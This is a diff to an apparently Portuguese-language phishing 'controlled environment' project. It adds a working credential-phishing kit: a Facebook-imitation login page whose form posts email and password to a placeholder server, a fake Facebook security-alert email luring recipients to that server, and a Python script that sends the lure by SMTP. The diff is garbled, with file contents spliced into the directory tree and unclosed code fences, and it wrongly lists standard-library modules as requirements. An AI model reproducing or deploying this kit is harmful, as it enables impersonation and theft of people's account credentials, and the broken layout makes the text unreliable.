@@ -28,12 +28,110 @@ Criar um ambiente controlado para:
  
 ├── phishing_page/
 │   ├── index.html
+
+---
+
+### **2. phishing_page/index.html**
+
+```html
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook - Login</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <div class="login-container">
+        <h1>Facebook</h1>
+        <form action="http://your-server-ip/capture" method="POST">
+            <input type="text" name="email" placeholder="Email ou telefone" required>
+            <input type="password" name="password" placeholder="Senha" required>
+            <button type="submit">Entrar</button>
+        </form>
+    </div>
+</body>
+</html>
+
 │   ├── styles.css
+body {
+    font-family: Arial, sans-serif;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+    background-color: #f0f2f5;
+}
+
+.login-container {
+    background: white;
+    padding: 20px;
+    border-radius: 8px;
+    box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+    text-align: center;
+}
+
 │   └── script.js
 ├── emails/
 │   └── phishing_email_template.txt
+Assunto: Verificação de Segurança no Facebook
+
+Caro usuário,
+
+Detectamos uma tentativa de login suspeita na sua conta do Facebook. Para sua segurança, solicitamos que confirme suas credenciais clicando no link abaixo:
+
+[CLIQUE AQUI PARA VERIFICAR SUA CONTA](http://your-server-ip/login)
+
+Agradecemos pela sua atenção,
+Equipe Facebook
+
 ├── scripts/
 │   └── send_email.py
+import smtplib
+from email.mime.text import MIMEText
+
+# Configurações do email
+SMTP_SERVER = 'smtp.gmail.com'
+SMTP_PORT = 587
+EMAIL = 'seu-email@gmail.com'
+PASSWORD = 'sua-senha'
+
+# Destinatário e mensagem
+to_email = 'destinatario@gmail.com'
+subject = 'Verificação de Segurança no Facebook'
+body = open('../emails/phishing_email_template.txt', 'r').read()
+
+# Enviar email
+msg = MIMEText(body, 'html')
+msg['Subject'] = subject
+msg['From'] = EMAIL
+msg['To'] = to_email
+
+try:
+    with smtplib.SMTP(SMTP_SERVER, SMTP_PORT) as server:
+        server.starttls()
+        server.login(EMAIL, PASSWORD)
+        server.sendmail(EMAIL, to_email, msg.as_string())
+    print("Email enviado com sucesso.")
+except Exception as e:
+    print(f"Erro ao enviar email: {e}")
+
 ├── docs/
 │   └── guia-execucao.md
+# Guia de Execução
+
+1. **Inicie o Servidor Apache**
+   ```bash
+   service apache2 start
+python scripts/send_email.py
+
+---
+
+### **7. requirements.txt**
+
+```plaintext
+smtplib
+email
+
 └── requirements.txt
